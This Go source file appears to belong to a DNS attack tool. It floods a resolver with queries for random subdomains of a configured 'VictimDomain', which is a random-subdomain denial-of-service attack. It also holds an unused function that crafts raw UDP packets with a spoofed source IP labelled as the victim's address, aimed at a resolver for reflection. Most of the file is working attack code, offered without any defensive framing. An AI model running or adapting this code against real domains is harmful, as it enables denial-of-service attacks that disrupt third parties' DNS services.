package internal

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

type DNSClient struct {
	hostPort string
	settings *Settings
	client   *dns.Client
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

const (
	// Message Response Codes, see https://www.iana.org/assignments/dns-parameters/dns-parameters.xhtml
	RcodeSuccess        = 0  // NoError   - No Error                          [DNS]
	RcodeFormatError    = 1  // FormErr   - Format Error                      [DNS]
	RcodeServerFailure  = 2  // ServFail  - Server Failure                    [DNS]
	RcodeNameError      = 3  // NXDomain  - Non-Existent Domain               [DNS]
	RcodeNotImplemented = 4  // NotImp    - Not Implemented                   [DNS]
	RcodeRefused        = 5  // Refused   - Query Refused                     [DNS]
	RcodeYXDomain       = 6  // YXDomain  - Name Exists when it should not    [DNS Update]
	RcodeYXRrset        = 7  // YXRRSet   - RR Set Exists when it should not  [DNS Update]
	RcodeNXRrset        = 8  // NXRRSet   - RR Set that should exist does not [DNS Update]
	RcodeNotAuth        = 9  // NotAuth   - Server Not Authoritative for zone [DNS Update]
	RcodeNotZone        = 10 // NotZone   - Name not contained in zone        [DNS Update/TSIG]
	RcodeBadSig         = 16 // BADSIG    - TSIG Signature Failure            [TSIG]
	RcodeBadKey         = 17 // BADKEY    - Key not recognized                [TSIG]
	RcodeBadTime        = 18 // BADTIME   - Signature out of time window      [TSIG]
	RcodeBadMode        = 19 // BADMODE   - Bad TKEY Mode                     [TKEY]
	RcodeBadName        = 20 // BADNAME   - Duplicate key name                [TKEY]
	RcodeBadAlg         = 21 // BADALG    - Algorithm not supported           [TKEY]
	RcodeBadTrunc       = 22 // BADTRUNC  - Bad Truncation                    [TSIG]
	RcodeBadCookie      = 23 // BADCOOKIE - Bad/missing Server Cookie         [DNS Cookies]

)

// RcodeToString maps Rcodes to strings.
var rcodeToString = map[int]string{
	RcodeSuccess:        "NOERROR",
	RcodeFormatError:    "FORMERR",
	RcodeServerFailure:  "SERVFAIL",
	RcodeNameError:      "NXDOMAIN",
	RcodeNotImplemented: "NOTIMP",
	RcodeRefused:        "REFUSED",
	RcodeYXDomain:       "YXDOMAIN", // See RFC 2136
	RcodeYXRrset:        "YXRRSET",
	RcodeNXRrset:        "NXRRSET",
	RcodeNotAuth:        "NOTAUTH",
	RcodeNotZone:        "NOTZONE",
	RcodeBadSig:         "BADSIG", // Also known as RcodeBadVers, see RFC 6891
	RcodeBadKey:         "BADKEY",
	RcodeBadTime:        "BADTIME",
	RcodeBadMode:        "BADMODE",
	RcodeBadName:        "BADNAME",
	RcodeBadAlg:         "BADALG",
	RcodeBadTrunc:       "BADTRUNC",
	RcodeBadCookie:      "BADCOOKIE",
}

func NewDNSClient(hostPort string, settings *Settings) (c DNSClient) {
	return DNSClient{
		hostPort: hostPort,
		settings: settings,
		client:   new(dns.Client),
	}
}

func (c DNSClient) SendDeepJunkDomainsRequest() {
	log.Fatalln("not yet implemented")
}

func (c DNSClient) SendRegularJunkDomainsRequest() {
	m := new(dns.Msg)
	for i := 0; i < *c.settings.NQuestions; i++ {
		m.SetQuestion(dns.CanonicalName(c.randomSubDomain()), dns.TypeAAAA)
	}
	r, rtt, err := c.client.Exchange(m, c.hostPort)
	var rcode *int
	if r != nil {
		rcode = &r.Rcode
	}
	c.printRegularLog(rtt, rcode, err)
}

func (c DNSClient) GetSenderFunc() func() {
	if *c.settings.Deep {
		return c.SendDeepJunkDomainsRequest
	}
	return c.SendRegularJunkDomainsRequest
}

// createPacket is unused
func (c DNSClient) createPacket(victim, resolver net.IP) (packet []byte, err error) {
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	ipLayer := &layers.IPv4{
		Version:  4,
		TTL:      255,
		SrcIP:    victim,   // spoofed IP address, actually one of the victim's IPs
		DstIP:    resolver, // resolver IP
		Protocol: layers.IPProtocolUDP,
	}
	udpLayer := &layers.UDP{
		SrcPort: layers.UDPPort(53),
		DstPort: layers.UDPPort(53),
	}
	dnsLayer := &layers.DNS{
		ID:        uint16(rand.Uint32()),
		QR:        false, // QR=0 is query
		OpCode:    layers.DNSOpCodeQuery,
		Questions: make([]layers.DNSQuestion, *c.settings.NQuestions),
		RD:        true, // Recursion Desired = true
	}
	for i := 0; i < *c.settings.NQuestions; i++ {
		dnsLayer.Questions[i] = layers.DNSQuestion{
			Name:  []byte(c.randomSubDomain()),
			Type:  layers.DNSTypeAAAA,
			Class: layers.DNSClassIN,
		}
	}
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		err = fmt.Errorf("failed to set network layer for checksum: %v", err)
		return
	}
	err = gopacket.SerializeLayers(buf, opts, ipLayer, udpLayer, dnsLayer)
	if err != nil {
		err = fmt.Errorf("failed to serialize packet: %v", err)
		return
	}
	return buf.Bytes(), nil
}

func (c DNSClient) printRegularLog(rtt time.Duration, rcode *int, netErr error) {
	errorMessage := "none"
	if netErr != nil {
		errorMessage = netErr.Error()
	}
	dnsErr := "none"
	if rcode != nil {
		dnsErr = rcodeToString[*rcode]
	}
	log.Printf("RTT: %-12s  DNS_ERR: %-8s  NET_ERR: %s", rtt.String(), dnsErr, errorMessage)
}

func (c *DNSClient) randomSubDomain() string {
	return fmt.Sprintf(
		"%s.%s.",
		c.randomString(32),
		*c.settings.VictimDomain,
	)
}

func (c *DNSClient) randomString(maxLen int) string {
	actualLen := rand.Intn(maxLen-1) + 1
	b := make([]rune, actualLen)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
